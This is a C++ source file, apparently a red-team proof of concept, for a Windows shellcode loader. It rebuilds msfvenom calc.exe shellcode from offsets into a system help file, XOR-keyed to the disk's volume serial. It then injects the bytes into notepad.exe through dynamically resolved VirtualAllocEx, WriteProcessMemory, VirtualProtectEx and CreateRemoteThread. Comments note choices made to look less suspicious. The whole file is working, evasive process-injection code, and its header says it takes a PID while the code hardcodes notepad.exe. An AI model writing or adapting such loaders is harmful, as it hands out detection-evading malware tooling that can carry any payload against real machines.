/*
* alphabet-loader.cpp: injecting calc.exe msfvenom shellcode that has been Alphabet Soup encoded into a remote process using dynamic function resolution
* shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f C EXITFUNC=thread
* compile: cl.exe alphabet-loader.cpp /D"_UNICODE" /D"UNICODE" /W0
* Usage: alphabet-loader.exe <PID>
*/
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <vector>

// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
typedef LPVOID(WINAPI* P_VirtualAllocEx)(
	HANDLE pHandle,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex
typedef BOOL(WINAPI* P_VirtualProtectEx) (
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
);

// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
typedef BOOL(WINAPI* P_WriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T  *lpNumberOfBytesWritten
);

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
typedef HANDLE(WINAPI* P_CreateRemoteThread) (
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId	
);

// Adapted from Pavel Yosifovich's Enumerate Processes (part 1): https://www.youtube.com/watch?v=IZULG6I4z5U
DWORD FindPidByName(LPCWSTR processName) {
    DWORD foundpid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return foundpid;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(processName, pe.szExeFile) == 0) {
                foundpid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return foundpid;
}

// the recipe
unsigned long long alphabetSoup[] = {
    1246007226, 1246025346, 1246014321, 1246054629, 1246038655, 1246046280, 1246008956, 1246080352, 1246071433, 1246075216, 1246096291, 1246065901,
    1246027113, 1246035537, 1246007836, 1246009586, 1246035128, 1246005795, 1246094839, 1246041404, 1246078537, 1246067948, 1246024374, 1246044666,
    1246090309, 1246016666, 1246094745, 1246067600, 1246033677, 1246062292, 1246030669, 1246064406, 1246006933, 1246007720, 1246043926, 1246079192,
    1246009650, 1246061288, 1246024468, 1246046195, 1246018208, 1246085173, 1246057467, 1246055513, 1246052284, 1246090289, 1246084135, 1246034602,
    1246062139, 1246036528, 1246060653, 1246091679, 1246037386, 1246009411, 1246054804, 1246053380, 1246039406, 1246083463, 1246009475, 1246086246,
    1246079789, 1246007062, 1246101003, 1246100746, 1246096329, 1246059262, 1246053804, 1246094012, 1246093899, 1246091977, 1246049722, 1246037484,
    1246063595, 1246098941, 1246055721, 1246081880, 1246038571, 1246030611, 1246039790, 1246030801, 1246072946, 1246074578, 1246071848, 1246050409,
    1246058837, 1246040538, 1246004321, 1246082987, 1246049836, 1246083609, 1246024433, 1246089556, 1246028871, 1246095792, 1246043657, 1246025370,
    1246009685, 1246065307, 1246098701, 1246016271, 1246006010, 1246083345, 1246089953, 1246043021, 1246086949, 1246071631, 1246003257, 1246050415,
    1246015587, 1246084901, 1246015087, 1246090285, 1246086022, 1246100950, 1246098224, 1246067818, 1246015720, 1246065680, 1246097247, 1246055682,
    1246026356, 1246039699, 1246023891, 1246066552, 1246088318, 1246044577, 1246083391, 1246047165, 1246032412, 1246088546, 1246082156, 1246064088,
    1246100482, 1246005930, 1246031928, 1246064134, 1246089025, 1246093920, 1246098025, 1246067470, 1246093610, 1246096919, 1246007522, 1246015551,
    1246068308, 1246010009, 1246031513, 1246083232, 1246099099, 1246033898, 1246081566, 1246029197, 1246026808, 1246061790, 1246058211, 1246063242,
    1246042139, 1246024674, 1246010866, 1246029169, 1246075282, 1246058222, 1246024852, 1246018830, 1246067993, 1246053190, 1246035912, 1246080159,
    1246088815, 1246012466, 1246009279, 1246094901, 1246063473, 1246036601, 1246036191, 1246088959, 1246059167, 1246009348, 1246010638, 1246100120,
    1246058286, 1246035584, 1246051909, 1246016829, 1246016362, 1246040382, 1246015707, 1246095048, 1246042729, 1246030884, 1246028887, 1246093818,
    1246086699, 1246056032, 1246055807, 1246047659, 1246004032, 1246029999, 1246065961, 1246071623, 1246083331, 1246059669, 1246090956, 1246055839,
    1246048286, 1246078345, 1246074884, 1246015192, 1246071158, 1246076193, 1246073642, 1246011662, 1246074454, 1246025470, 1246006551, 1246040407,
    1246030216, 1246081061, 1246068833, 1246072041, 1246095321, 1246053503, 1246064095, 1246034524, 1246082218, 1246096944, 1246071621, 1246088851,
    1246096217, 1246050655, 1246067879, 1246029741, 1246050003, 1246008847, 1246092772, 1246012606, 1246014802, 1246088220, 1246095690, 1246083424,
    1246040736, 1246043009, 1246079728, 1246018997, 1246026165, 1246088707, 1246017784, 1246087378, 1246042862, 1246097184, 1246101209, 1246061449,
    1246079267, 1246032200, 1246101332, 1246006426, 1246050579, 1246007984, 1246082819, 1246019552, 1246069910, 1246058232, 1246064219, 1246057731,
    1246007337, 1246049435, 1246050307, 1246040805, 1246081594, 1246013998, 1246075200, 1246099142, 1246057364, 1246065982, 1246033979, 1246100226,
};
const size_t soupSize = sizeof(alphabetSoup) / sizeof(unsigned long long);

int main() {
    printf("[*] Alphabet Soup PoC Remote Loader\n");

	P_VirtualAllocEx myVirtualAllocEx = nullptr;
	P_WriteProcessMemory myWriteProcessMemory = nullptr;
	P_VirtualProtectEx myVirtualProtectEx = nullptr;
	P_CreateRemoteThread myCreateRemoteThread = nullptr;

    // retrieve the XOR key
    printf("[*] Retrieving XOR key\n");
    DWORD soupKey = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &soupKey, NULL, NULL, NULL, 0);
    printf("[+] Local XOR Key Detected: 0x%08X\n", soupKey);
    
    // map the dictionary file
    printf("[*] Mapping dictionary\n");
    HANDLE hFile = CreateFileA("C:\\Windows\\Help\\mui\\0409\\cliconf.chm", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID pChmBase = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

    // Assemble the soup locally first
    std::vector<BYTE> localBowl(soupSize);
    for (size_t i = 0; i < soupSize; i++) {
        unsigned long long realOffset = alphabetSoup[i] ^ soupKey;
        localBowl[i] = *((BYTE*)pChmBase + (DWORD)realOffset);
    }

    printf("[*] Locating remote process\n");
    DWORD pid = 0;
    const wchar_t* processName = L"notepad.exe";

    pid = FindPidByName(processName);
    if (pid == 0) {
        printf("[ERROR] Failed to obtain process ID!\n");
        return -1;
    }

    printf("[*] Running PI with target PID: %u\n", pid);

    // Open a handle to the current process, this must be passed to VirtualAllocEx
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
    if (pHandle == NULL) {
        printf("Failed to acquire process handle!\n");
        return -1;
    }

    // Obtain a handle to the kernel32.dll module, this will be passed to GetProcAddress
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        printf("[ERROR] Failed to get handle to kernel32.dll. Error: %u\n", GetLastError());
        return -1;
    }
	
	// Use GetProcAddress to get the address of the VirtualAllocEx function
	myVirtualAllocEx = (P_VirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
	if (myVirtualAllocEx == nullptr) {
		printf("[ERROR] Failed to resolve VirtualAllocEx. Error: %u\n", GetLastError());
		FreeLibrary(hKernel32); // Clean up the module handle
		return -1;
	}

    // Use GetProcAddress to get the address of the WriteProcessMemory function
    myWriteProcessMemory = (P_WriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
    if (myWriteProcessMemory == nullptr) {
      printf("[ERROR] Failed to resolve WriteProcessMemory. Error: %u\n", GetLastError());
      FreeLibrary(hKernel32); // Clean up the module handle
      return -1;
    }

    // Use GetProcAddress to get the address of the VirtualProtectEx function
    myVirtualProtectEx = (P_VirtualProtectEx)GetProcAddress(hKernel32, "VirtualProtectEx");
    if (myVirtualProtectEx == nullptr) {
        printf("[ERROR] Failed to resolve VirtualProtectEx. Error: %u\n", GetLastError());
        FreeLibrary(hKernel32); // Clean up the module handle
        return -1;
    }

	// Use GetProcAddress to get the address of the CreateRemoteThread function
	myCreateRemoteThread = (P_CreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");
	if (myCreateRemoteThread == nullptr) {
		printf("[ERROR] Failed to resolve CreateRemoteThread. Error: %u\n", GetLastError());
		FreeLibrary(hKernel32); // Clean up the module handle
		return -1;
	}	

    printf("[*] Successfully opened handle to PID: %u\n", pid);

    // Allocate a block of memory that can store our shellcode, RW memory protection is slightly less suspicious
    LPVOID bufferAddress = myVirtualAllocEx(pHandle, NULL, soupSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (bufferAddress == NULL) {
        printf("[ERROR] Failed to allocate memory within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
        return -1;
    }

    printf("[*] Memory allocated at: 0x%016llx\n", bufferAddress);

    // Write the shellcode to the block of memory that we allocated with VirtualAllocEx
    BOOL writeShellcode = myWriteProcessMemory(pHandle, bufferAddress, localBowl.data(), soupSize, NULL);
    if (writeShellcode == false) {
        printf("[ERROR] Failed to write shellcode! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
        VirtualFree(bufferAddress, 0, MEM_RELEASE);
        return -1;
    }

    // Update the memory protection value from RW to RWX
    DWORD lpOldProtect = NULL;
    BOOL updateMemoryProtection = myVirtualProtectEx(pHandle, bufferAddress, soupSize, PAGE_EXECUTE_READWRITE, &lpOldProtect);
    if (updateMemoryProtection == false) {
        printf("[ERROR] Failed to update memory protection (updating from RW to RWX)! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
        VirtualFree(bufferAddress, 0, MEM_RELEASE);
        return -1;
    }

    // Create a new thread using the shellcode buffer address as the starting point
    HANDLE tHandle = myCreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, 0, NULL);
    if (tHandle == NULL) {
        printf("[ERROR] Failed to create thread within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
        VirtualFree(bufferAddress, 0, MEM_RELEASE);
        return -1;
    }

    // Wait for the thread to return - not required, but it definitely makes the demonstration much cleaner
    printf("[*] Waiting for the thread to return...\n");
    WaitForSingleObject(tHandle, INFINITE);

    // Update the memory protection value from RWX to RW
    updateMemoryProtection = myVirtualProtectEx(pHandle, bufferAddress, soupSize, PAGE_READWRITE, &lpOldProtect);
    if (updateMemoryProtection == false) {
        printf("[ERROR] Failed to update memory protection (toggling back to RW)! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
        VirtualFree(bufferAddress, 0, MEM_RELEASE);
        return -1;
    }

    // Clean up open handles and free the shellcode buffer memory
    CloseHandle(pHandle);
    CloseHandle(tHandle);
    VirtualFree(bufferAddress, 0, MEM_RELEASE);
	FreeLibrary(hKernel32); // Clean up the module handle

    printf("[*] Process injection complete.\n");

    return 0;
}